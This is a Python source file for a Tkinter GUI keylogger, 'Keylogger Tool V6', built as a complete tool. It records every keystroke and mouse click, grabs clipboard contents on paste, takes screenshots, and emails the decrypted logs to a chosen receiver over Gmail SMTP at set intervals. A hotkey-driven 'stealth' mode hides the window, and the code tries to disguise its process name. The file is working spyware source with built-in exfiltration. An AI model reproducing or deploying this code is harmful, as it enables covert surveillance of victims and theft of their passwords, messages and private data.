import tkinter as tk
from tkinter import filedialog, ttk, messagebox, scrolledtext
from pynput import keyboard, mouse
import os
import time
import threading
import datetime
import pyperclip
import smtplib
from email.mime.text import MIMEText
from PIL import Image, ImageGrab
from cryptography.fernet import Fernet
import pygame
import platform
import psutil
import socket
import random
import string

class AdvancedKeylogger:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylog-v6")
        self.root.geometry("900x800")
        self.is_logging = False
        self.is_stealth = False
        self.is_paused = False
        self.log_thread = None
        self.keys = []
        self.current_session_keys = []
        self.log_folder = "keylogs"
        self.screenshot_folder = "screenshots"
        self.encryption_key = None
        self.cipher = None
        self.theme = "mr_robot"
        self.email_config = {"enabled": False, "email": "", "password": "", "receiver": "", "interval": 300}
        self.hotkeys = {"stealth": "f12", "pause": "f11"}
        self.last_key_time = None
        self.session_stats = {"keys_pressed": 0, "most_used": {}, "start_time": None}
        self.current_session_folder = None
        pygame.mixer.init()
        self.setup_folders()
        self.setup_encryption()
        self.setup_gui()
        self.apply_theme()
        self.hotkey_listener = None
        self.mouse_listener = None
        self.start_hotkey_listener()
        self.optimize_performance()

    def setup_folders(self):
        try:
            os.makedirs(self.log_folder, exist_ok=True)
            os.makedirs(self.screenshot_folder, exist_ok=True)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create folders: {str(e)}")

    def setup_encryption(self):
        key_file = "encryption_key.key"
        try:
            if os.path.exists(key_file):
                with open(key_file, "rb") as f:
                    self.encryption_key = f.read()
            else:
                self.encryption_key = Fernet.generate_key()
                with open(key_file, "wb") as f:
                    f.write(self.encryption_key)
            self.cipher = Fernet(self.encryption_key)
        except Exception as e:
            messagebox.showerror("Error", f"Encryption setup failed: {str(e)}")

    def setup_gui(self):
        self.main_frame = ttk.Frame(self.root, padding="10")
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        self.title_label = ttk.Label(self.main_frame, text=" Keylogger Tool V6", font=("Consolas", 20, "bold"))
        self.title_label.pack(pady=10)
        self.window_frame = ttk.Frame(self.main_frame)
        self.window_frame.pack(fill=tk.X)
        self.fullscreen_button = ttk.Button(self.window_frame, text="Fullscreen", command=self.toggle_fullscreen)
        self.fullscreen_button.pack(side=tk.LEFT, padx=5)
        self.minimize_button = ttk.Button(self.window_frame, text="Minimize", command=self.minimize)
        self.minimize_button.pack(side=tk.LEFT, padx=5)
        self.halfscreen_button = ttk.Button(self.window_frame, text="Half Screen", command=self.toggle_halfscreen)
        self.halfscreen_button.pack(side=tk.LEFT, padx=5)
        self.control_frame = ttk.Frame(self.main_frame)
        self.control_frame.pack(fill=tk.X, pady=5)
        self.start_button = ttk.Button(self.control_frame, text="Start Logging", command=self.start_logging)
        self.start_button.pack(side=tk.LEFT, padx=5)
        self.stop_button = ttk.Button(self.control_frame, text="Stop Logging", command=self.stop_logging, state="disabled")
        self.stop_button.pack(side=tk.LEFT, padx=5)
        self.pause_button = ttk.Button(self.control_frame, text="Pause Logging", command=self.pause_logging, state="disabled")
        self.pause_button.pack(side=tk.LEFT, padx=5)
        self.stealth_button = ttk.Button(self.control_frame, text="Toggle Stealth", command=self.toggle_stealth)
        self.stealth_button.pack(side=tk.LEFT, padx=5)
        self.preview_frame = ttk.Frame(self.main_frame)
        self.preview_frame.pack(pady=5, fill=tk.BOTH, expand=True)
        self.preview_label = ttk.Label(self.preview_frame, text="Real-Time Log Preview:", font=("Consolas", 12))
        self.preview_label.pack(pady=5)
        self.preview_text = scrolledtext.ScrolledText(self.preview_frame, height=15, width=80, state="disabled", font=("Consolas", 12))
        self.preview_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar = ttk.Scrollbar(self.preview_frame, command=self.preview_text.yview, cursor="hand2")
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.preview_text.configure(yscrollcommand=scrollbar.set, bg="#000000", fg="#ff0000", relief=tk.RAISED, borderwidth=3)
        self.search_frame = ttk.Frame(self.main_frame)
        self.search_frame.pack(fill=tk.X, pady=5)
        self.search_label = ttk.Label(self.search_frame, text="Search Logs:")
        self.search_label.pack(side=tk.LEFT, padx=5)
        self.search_entry = ttk.Entry(self.search_frame, width=50)
        self.search_entry.pack(side=tk.LEFT, padx=5)
        self.search_button = ttk.Button(self.search_frame, text="Search", command=self.search_logs)
        self.search_button.pack(side=tk.LEFT, padx=5)
        self.settings_frame = ttk.LabelFrame(self.main_frame, text="Settings", padding="10")
        self.settings_frame.pack(fill=tk.X, pady=10)
        self.general_frame = ttk.LabelFrame(self.settings_frame, text="General", padding="5")
        self.general_frame.pack(fill=tk.X, pady=5)
        self.folder_label = ttk.Label(self.general_frame, text="Log Folder:", font=("Consolas", 10))
        self.folder_label.grid(row=0, column=0, sticky="w", padx=5)
        self.folder_entry = ttk.Entry(self.general_frame, width=40, font=("Consolas", 10))
        self.folder_entry.insert(0, self.log_folder)
        self.folder_entry.grid(row=0, column=1, padx=5)
        self.folder_button = ttk.Button(self.general_frame, text="Browse", command=self.browse_folder)
        self.folder_button.grid(row=0, column=2, padx=5)
        self.auto_delete = tk.BooleanVar()
        self.auto_delete_check = ttk.Checkbutton(self.general_frame, text="Auto Delete Old Logs (7 days)", variable=self.auto_delete)
        self.auto_delete_check.grid(row=1, column=0, columnspan=3, sticky="w", pady=5)
        self.email_frame = ttk.LabelFrame(self.settings_frame, text="Email", padding="5")
        self.email_frame.pack(fill=tk.X, pady=5)
        self.email_enabled = tk.BooleanVar()
        self.email_check = ttk.Checkbutton(self.email_frame, text="Enable Email Alerts", variable=self.email_enabled, command=self.toggle_email_settings)
        self.email_check.grid(row=0, column=0, columnspan=3, sticky="w", pady=5)
        self.email_label = ttk.Label(self.email_frame, text="Your Email:", font=("Consolas", 10))
        self.email_label.grid(row=1, column=0, sticky="w", padx=5)
        self.email_entry = ttk.Entry(self.email_frame, width=40, font=("Consolas", 10))
        self.email_entry.grid(row=1, column=1, columnspan=2, padx=5)
        self.pass_label = ttk.Label(self.email_frame, text="Email Password:", font=("Consolas", 10))
        self.pass_label.grid(row=2, column=0, sticky="w", padx=5)
        self.pass_entry = ttk.Entry(self.email_frame, width=40, show="*", font=("Consolas", 10))
        self.pass_entry.grid(row=2, column=1, columnspan=2, padx=5)
        self.receiver_label = ttk.Label(self.email_frame, text="Receiver Email:", font=("Consolas", 10))
        self.receiver_label.grid(row=3, column=0, sticky="w", padx=5)
        self.receiver_entry = ttk.Entry(self.email_frame, width=40, font=("Consolas", 10))
        self.receiver_entry.grid(row=3, column=1, columnspan=2, padx=5)
        self.interval_label = ttk.Label(self.email_frame, text="Email Interval (sec):", font=("Consolas", 10))
        self.interval_label.grid(row=4, column=0, sticky="w", padx=5)
        self.interval_entry = ttk.Entry(self.email_frame, width=10, font=("Consolas", 10))
        self.interval_entry.insert(0, "300")
        self.interval_entry.grid(row=4, column=1, sticky="w", padx=5)
        self.advanced_frame = ttk.LabelFrame(self.settings_frame, text="Advanced", padding="5")
        self.advanced_frame.pack(fill=tk.X, pady=5)
        self.log_interval_label = ttk.Label(self.advanced_frame, text="Log Interval (sec):", font=("Consolas", 10))
        self.log_interval_label.grid(row=0, column=0, sticky="w", padx=5)
        self.log_interval_entry = ttk.Entry(self.advanced_frame, width=10, font=("Consolas", 10))
        self.log_interval_entry.insert(0, "30")
        self.log_interval_entry.grid(row=0, column=1, sticky="w", padx=5)
        self.sensitivity_label = ttk.Label(self.advanced_frame, text="Key Sensitivity:", font=("Consolas", 10))
        self.sensitivity_label.grid(row=1, column=0, sticky="w", padx=5)
        self.sensitivity_var = tk.StringVar(value="Normal")
        self.sensitivity_menu = ttk.OptionMenu(self.advanced_frame, self.sensitivity_var, "Normal", "High", "Low")
        self.sensitivity_menu.grid(row=1, column=1, sticky="w", padx=5)
        self.hotkey_label = ttk.Label(self.advanced_frame, text="Hotkeys (e.g., f12):", font=("Consolas", 10))
        self.hotkey_label.grid(row=2, column=0, sticky="w", padx=5)
        self.stealth_hotkey_entry = ttk.Entry(self.advanced_frame, width=10, font=("Consolas", 10))
        self.stealth_hotkey_entry.insert(0, self.hotkeys["stealth"])
        self.stealth_hotkey_entry.grid(row=2, column=1, sticky="w", padx=5)
        self.pause_hotkey_entry = ttk.Entry(self.advanced_frame, width=10, font=("Consolas", 10))
        self.pause_hotkey_entry.insert(0, self.hotkeys["pause"])
        self.pause_hotkey_entry.grid(row=2, column=2, sticky="w", padx=5)
        self.save_settings_button = ttk.Button(self.settings_frame, text="Save Settings", command=self.save_settings)
        self.save_settings_button.pack(pady=5)
        self.theme_button = ttk.Button(self.main_frame, text="Toggle Theme", command=self.toggle_theme)
        self.theme_button.pack(pady=5)
        self.status_label = ttk.Label(self.main_frame, text="Status: Idle", wraplength=700, font=("Consolas", 12))
        self.status_label.pack(pady=5)

    def apply_theme(self):
        themes = {
            "dark": {"bg": "#1c2526", "fg": "#00ff00", "button_bg": "#2e2e2e", "button_fg": "#00ff00", "hover_bg": "#3a3a3a"},
            "light": {"bg": "#ffffff", "fg": "#000000", "button_bg": "#e0e0e0", "button_fg": "#000000", "hover_bg": "#d0d0d0"},
            "hacker": {"bg": "#000000", "fg": "#00ff00", "button_bg": "#1a1a1a", "button_fg": "#00ff00", "hover_bg": "#2a2a2a"},
            "mr_robot": {"bg": "#000000", "fg": "#ff0000", "button_bg": "#1a1a1a", "button_fg": "#ff0000", "hover_bg": "#2a2a2a", "glitch": True},
            "green": {"bg": "#003300", "fg": "#00ff00", "button_bg": "#006600", "button_fg": "#00ff00", "hover_bg": "#008000"},
            "purple": {"bg": "#2a0033", "fg": "#cc00ff", "button_bg": "#4d0066", "button_fg": "#cc00ff", "hover_bg": "#660099"},
            "red": {"bg": "#330000", "fg": "#ff0000", "button_bg": "#660000", "button_fg": "#ff0000", "hover_bg": "#990000"}
        }
        style = ttk.Style()
        style.configure("TFrame", background=themes[self.theme]["bg"])
        style.configure("TLabel", background=themes[self.theme]["bg"], foreground=themes[self.theme]["fg"], font=("Consolas", 10))
        style.configure("TButton", background=themes[self.theme]["button_bg"], foreground=themes[self.theme]["button_fg"], font=("Consolas", 10, "bold"))
        style.configure("Hover.TButton", background=themes[self.theme]["hover_bg"], foreground=themes[self.theme]["button_fg"], font=("Consolas", 10, "bold"))
        style.configure("TEntry", fieldbackground=themes[self.theme]["bg"], foreground=themes[self.theme]["fg"], font=("Consolas", 10))
        style.configure("TCheckbutton", background=themes[self.theme]["bg"], foreground=themes[self.theme]["fg"], font=("Consolas", 10))
        self.root.configure(bg=themes[self.theme]["bg"])
        self.main_frame.configure(style="TFrame")
        self.preview_text.configure(bg=themes[self.theme]["bg"], fg=themes[self.theme]["fg"])
        if themes[self.theme].get("glitch", False):
            self.apply_glitch_effect()

    def apply_glitch_effect(self):
        def glitch():
            while self.theme == "mr_robot" and self.is_logging:
                if random.random() < 0.1:
                    self.preview_text.configure(state="normal")
                    self.preview_text.insert(tk.END, random.choice(string.ascii_letters) + " ")
                    self.preview_text.see(tk.END)
                    self.preview_text.configure(state="disabled")
                    self.root.after(50, lambda: self.preview_text.delete("end-2c", "end"))
                time.sleep(0.1)
        threading.Thread(target=glitch, daemon=True).start()

    def toggle_theme(self):
        themes = ["dark", "light", "hacker", "mr_robot", "green", "purple", "red"]
        self.theme = themes[(themes.index(self.theme) + 1) % len(themes)]
        self.apply_theme()

    def toggle_fullscreen(self):
        self.root.attributes("-fullscreen", not self.root.attributes("-fullscreen"))
        self.fullscreen_button.configure(text="Exit Fullscreen" if self.root.attributes("-fullscreen") else "Fullscreen")

    def minimize(self):
        self.root.iconify()

    def toggle_halfscreen(self):
        current_height = self.root.winfo_height()
        if current_height == 800:
            self.root.geometry("900x400")
        else:
            self.root.geometry("900x800")

    def browse_folder(self):
        folder = filedialog.askdirectory()
        if folder:
            self.folder_entry.delete(0, tk.END)
            self.folder_entry.insert(0, folder)
            self.log_folder = folder
            os.makedirs(self.log_folder, exist_ok=True)

    def toggle_email_settings(self):
        state = "normal" if self.email_enabled.get() else "disabled"
        for widget in [self.email_entry, self.pass_entry, self.receiver_entry, self.interval_entry]:
            widget.configure(state=state)

    def save_settings(self):
        self.log_folder = self.folder_entry.get() or "keylogs"
        os.makedirs(self.log_folder, exist_ok=True)
        self.email_config["enabled"] = self.email_enabled.get()
        self.email_config["email"] = self.email_entry.get()
        self.email_config["password"] = self.pass_entry.get()
        self.email_config["receiver"] = self.receiver_entry.get()
        try:
            self.email_config["interval"] = int(self.interval_entry.get())
        except ValueError:
            self.email_config["interval"] = 300
        try:
            self.log_interval = int(self.log_interval_entry.get())
        except ValueError:
            self.log_interval = 30
        self.hotkeys["stealth"] = self.stealth_hotkey_entry.get() or "f12"
        self.hotkeys["pause"] = self.pause_hotkey_entry.get() or "f11"
        if self.auto_delete.get():
            self.delete_old_logs()
        self.restart_hotkey_listener()
        messagebox.showinfo("Success", "Settings saved.")

    def delete_old_logs(self):
        for file in os.listdir(self.log_folder):
            if file.endswith(".txt") and datetime.datetime.now() - datetime.datetime.fromtimestamp(os.path.getctime(os.path.join(self.log_folder, file))) > datetime.timedelta(days=7):
                os.remove(os.path.join(self.log_folder, file))

    def start_hotkey_listener(self):
        def on_hotkey(key):
            try:
                key_str = str(key).replace("Key.", "").lower()
                if key_str == self.hotkeys["stealth"]:
                    self.toggle_stealth()
                elif key_str == self.hotkeys["pause"]:
                    self.pause_logging()
            except:
                pass
        self.hotkey_listener = keyboard.Listener(on_press=on_hotkey)
        self.hotkey_listener.start()

    def restart_hotkey_listener(self):
        if self.hotkey_listener:
            self.hotkey_listener.stop()
        self.start_hotkey_listener()

    def start_logging(self):
        if self.is_logging:
            return
        self.is_logging = True
        self.is_paused = False
        self.session_stats = {"keys_pressed": 0, "most_used": {}, "start_time": None}
        self.start_button.configure(state="disabled")
        self.stop_button.configure(state="normal")
        self.pause_button.configure(state="normal")
        self.status_label.configure(text="Status: Logging started...")
        self.log_thread = threading.Thread(target=self.log_keys, daemon=True)
        self.log_thread.start()
        self.mouse_listener = mouse.Listener(on_click=self.on_mouse_click)
        self.mouse_listener.start()
        if self.email_config["enabled"]:
            threading.Thread(target=self.email_logs_periodically, daemon=True).start()
        threading.Thread(target=self.auto_save_logs, daemon=True).start()
        self.session_stats["start_time"] = datetime.datetime.now()

    def stop_logging(self):
        self.is_logging = False
        self.is_paused = False
        self.start_button.configure(state="normal")
        self.stop_button.configure(state="disabled")
        self.pause_button.configure(state="disabled")
        self.status_label.configure(text="Status: Logging stopped.")
        self.save_log()
        self.save_session_summary()
        self.keys = []
        self.current_session_keys = []
        if self.current_session_folder and os.path.exists(self.current_session_folder):
            self.save_session_content()
        if self.mouse_listener:
            self.mouse_listener.stop()

    def pause_logging(self):
        if self.is_logging and not self.is_paused:
            self.is_paused = True
            self.pause_button.configure(text="Resume Logging")
            self.status_label.configure(text="Status: Logging paused.")
        elif self.is_logging and self.is_paused:
            self.is_paused = False
            self.pause_button.configure(text="Pause Logging")
            self.status_label.configure(text="Status: Logging resumed.")

    def toggle_stealth(self):
        self.is_stealth = not self.is_stealth
        if self.is_stealth:
            self.root.withdraw()
            self.stealth_button.configure(text="Exit Stealth")
            self.status_label.configure(text="Status: Stealth mode enabled.")
        else:
            self.root.deiconify()
            self.stealth_button.configure(text="Toggle Stealth")
            self.status_label.configure(text="Status: Stealth mode disabled.")

    def log_keys(self):
        def on_press(key):
            if not self.is_logging or self.is_paused:
                return
            try:
                timestamp = datetime.datetime.now()
                time_str = timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
                interval = 0.0 if self.last_key_time is None else (timestamp - self.last_key_time).total_seconds()
                self.last_key_time = timestamp
                key_str = self.process_key(key)
                if key_str:
                    log_entry = f"[{time_str}]  {key_str} ({interval:.0f}s)"
                    self.keys.append(log_entry)
                    self.current_session_keys.append(key_str if key_str not in ["[ENTER]", "[SCREENSHOT]"] else "")
                    self.update_preview(log_entry)
                    self.session_stats["keys_pressed"] += 1
                    self.session_stats["most_used"][key_str] = self.session_stats["most_used"].get(key_str, 0) + 1
                    if key_str == "[ENTER]":
                        self.create_new_session_folder()
                        self.save_session_content()
                        self.current_session_keys = []
                    elif key_str in ["[ENTER]", "[CTRL+V]"]:
                        self.take_screenshot()
            except Exception as e:
                self.keys.append(f"[{time_str}] Error: {str(e)}")
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def on_mouse_click(self, x, y, button, pressed):
        if not self.is_logging or self.is_paused or not pressed:
            return
        timestamp = datetime.datetime.now()
        time_str = timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        interval = 0.0 if self.last_key_time is None else (timestamp - self.last_key_time).total_seconds()
        self.last_key_time = timestamp
        button_str = "Left" if button == mouse.Button.left else "Right"
        log_entry = f"[{time_str}]  [MOUSE_{button_str}] ({interval:.0f}s)"
        self.keys.append(log_entry)
        self.update_preview(log_entry)
        self.session_stats["keys_pressed"] += 1
        self.session_stats["most_used"][f"[MOUSE_{button_str}]"] = self.session_stats["most_used"].get(f"[MOUSE_{button_str}]", 0) + 1

    def process_key(self, key):
        try:
            if hasattr(key, "char") and key.char:
                return key.char
            else:
                key_str = str(key).replace("Key.", "").upper()
                if key_str == "SPACE":
                    return "[SPACE]"
                elif key_str == "ENTER":
                    return "[ENTER]"
                elif key_str == "BACKSPACE":
                    return "[BACKSPACE]"
                elif key_str == "TAB":
                    return "[TAB]"
                elif key_str in ["CTRL_L", "CTRL_R"]:
                    if key_str == "CTRL_L" and keyboard.Controller().pressed(keyboard.KeyCode.from_vk(86)):
                        clipboard = pyperclip.paste()
                        return f"[CTRL+V] Clipboard: {clipboard}"
                    return f"[{key_str}]"
                elif key_str in ["SHIFT", "SHIFT_R", "ALT", "ALT_R", "CMD", "CMD_R"]:
                    return f"[{key_str}]"
                return f"[{key_str}]"
        except:
            return None

    def update_preview(self, log_entry):
        self.preview_text.configure(state="normal")
        self.preview_text.delete(1.0, tk.END)
        for entry in self.keys[-15:]:
            date_part, key_time_part = entry.split("]  ", 1)
            key_time = key_time_part.split(" (")
            key = key_time[0].strip()
            time = f"({key_time[1]})"
            self.preview_text.insert(tk.END, f"{date_part}] ", "date")
            self.preview_text.insert(tk.END, f"{key} ", "key")
            self.preview_text.insert(tk.END, f"{time}\n", "time")
        self.preview_text.tag_configure("date", font=("Consolas", 8), foreground="#555555")
        self.preview_text.tag_configure("key", font=("Consolas", 14, "bold"), foreground="#ff0000")
        self.preview_text.tag_configure("time", font=("Consolas", 12, "bold"), foreground="#ff4500")
        if "SAVED" in log_entry:
            self.preview_text.tag_add("saved", "end-2l", "end-1l")
            self.preview_text.tag_configure("saved", background="#00ff00")
        self.preview_text.see(tk.END)
        self.preview_text.configure(state="disabled")

    def create_new_session_folder(self):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.current_session_folder = os.path.join(self.log_folder, f"session_{timestamp}.keylog")
        os.makedirs(self.current_session_folder, exist_ok=True)

    def save_session_content(self):
        if self.current_session_folder and self.current_session_keys:
            content_file = os.path.join(self.current_session_folder, "content.txt")
            sentence = " ".join(self.current_session_keys)
            try:
                with open(content_file, "a") as f:
                    f.write(sentence + "\n")
                time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
                self.keys.append(f"[{time_str}]  [SESSION SAVED] (0s) [SAVED]")
                self.update_preview(self.keys[-1])
            except Exception as e:
                time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
                self.keys.append(f"[{time_str}] Error: {str(e)}")

    def take_screenshot(self):
        try:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            screenshot = ImageGrab.grab()
            screenshot.save(os.path.join(self.screenshot_folder, f"screenshot_{timestamp}.png"))
            time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            log_entry = f"[{time_str}]  [SCREENSHOT] (0s) [SAVED]"
            self.keys.append(log_entry)
            self.update_preview(log_entry)
        except Exception as e:
            time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            self.keys.append(f"[{time_str}] Error: {str(e)}")

    def save_log(self):
        if not self.keys:
            return
        date = datetime.datetime.now().strftime("%Y-%m-%d")
        log_file = os.path.join(self.log_folder, f"log_{date}.txt")
        log_content = "\n".join(self.keys)
        try:
            encrypted_content = self.cipher.encrypt(log_content.encode())
            with open(log_file, "wb") as f:
                f.write(encrypted_content)
            time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            self.keys.append(f"[{time_str}]  [LOG SAVED] (0s) [SAVED]")
            self.update_preview(self.keys[-1])
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("Error", f"Failed to save log: {str(e)}"))

    def auto_save_logs(self):
        while self.is_logging:
            self.save_log()
            try:
                self.log_interval = int(self.log_interval_entry.get())
            except ValueError:
                self.log_interval = 30
            time.sleep(self.log_interval)

    def save_session_summary(self):
        if not self.session_stats["start_time"]:
            return
        end_time = datetime.datetime.now()
        duration = (end_time - self.session_stats["start_time"]).total_seconds() / 60.0
        most_used = sorted(self.session_stats["most_used"].items(), key=lambda x: x[1], reverse=True)[:5]
        summary = [
            f"Session Summary - {end_time.strftime('%Y-%m-%d %H:%M:%S')}",
            f"Total Duration: {duration:.2f} minutes",
            f"Total Keys Pressed: {self.session_stats['keys_pressed']}",
            "Top 5 Most Used Keys:",
            *[f"  {k}: {v} times" for k, v in most_used],
            f"Network Status: {self.get_network_status()}",
            f"Session Start: {self.session_stats['start_time'].strftime('%Y-%m-%d %H:%M:%S')}",
            f"Session End: {end_time.strftime('%Y-%m-%d %H:%M:%S')}"
        ]
        summary_file = os.path.join(self.log_folder, f"summary_{end_time.strftime('%Y-%m-%d')}.txt")
        try:
            with open(summary_file, "w") as f:
                f.write("\n".join(summary))
            time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            self.keys.append(f"[{time_str}]  [SUMMARY SAVED] (0s) [SAVED]")
            self.update_preview(self.keys[-1])
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save summary: {str(e)}")

    def get_network_status(self):
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            return "Connected"
        except:
            return "Disconnected"

    def email_logs_periodically(self):
        while self.is_logging and self.email_config["enabled"]:
            self.save_log()
            date = datetime.datetime.now().strftime("%Y-%m-%d")
            log_file = os.path.join(self.log_folder, f"log_{date}.txt")
            if os.path.exists(log_file):
                try:
                    with open(log_file, "rb") as f:
                        content = self.cipher.decrypt(f.read()).decode()
                    msg = MIMEText(content)
                    msg["Subject"] = f"Keylogger Log {date}"
                    msg["From"] = self.email_config["email"]
                    msg["To"] = self.email_config["receiver"]
                    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                        server.login(self.email_config["email"], self.email_config["password"])
                        server.sendmail(self.email_config["email"], self.email_config["receiver"], msg.as_string())
                    time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
                    self.keys.append(f"[{time_str}]  [EMAIL SENT] (0s) [SAVED]")
                    self.update_preview(self.keys[-1])
                except Exception as e:
                    self.root.after(0, lambda: messagebox.showerror("Error", f"Email failed: {str(e)}"))
            time.sleep(self.email_config["interval"])

    def search_logs(self):
        query = self.search_entry.get().lower()
        if not query:
            messagebox.showinfo("Info", "Please enter a search query.")
            return
        self.preview_text.configure(state="normal")
        self.preview_text.delete(1.0, tk.END)
        found = False
        for log in self.keys:
            if query in log.lower():
                self.preview_text.insert(tk.END, f"{log}\n")
                found = True
        if not found:
            self.preview_text.insert(tk.END, "No matches found.\n")
        self.preview_text.configure(state="disabled")

    def play_sound(self):
        try:
            sound_file = "notification.wav"
            pygame.mixer.music.load(sound_file)
            pygame.mixer.music.play()
        except Exception as e:
            print(f"Sound playback failed: {str(e)}")

    def optimize_performance(self):
        try:
            process = psutil.Process()
            process.cpu_affinity([0])
            process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS if platform.system() == "Windows" else 10)
            random_name = "".join(random.choices(string.ascii_letters, k=10))
            psutil.Process().name = lambda: random_name
        except Exception as e:
            print(f"Performance optimization failed: {str(e)}")

def main():
    root = tk.Tk()
    app = AdvancedKeylogger(root)
    root.mainloop()

if __name__ == "__main__":
    main()
